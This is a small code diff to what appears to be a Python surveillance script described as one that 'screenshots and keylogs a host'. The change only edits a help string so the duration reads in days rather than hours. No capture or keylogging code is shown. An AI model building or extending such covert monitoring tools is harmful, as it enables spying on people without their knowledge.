@@ -33,7 +33,7 @@ if __name__ == '__main__':
                                     description = "Screenshots and keylogs a host",
                                 )
     parser.add_argument("-d", "--duration", type=int, default=7,
-                      help = "The duration of the script in hours")
+                      help = "The duration of the script in days")
     parser.add_argument("-i", "--interval", type=int, default=10,
                       help = "The interval of the screenshots in seconds")
     parser.add_argument("-o", "--output_dir", default=os.environ['HOME'],
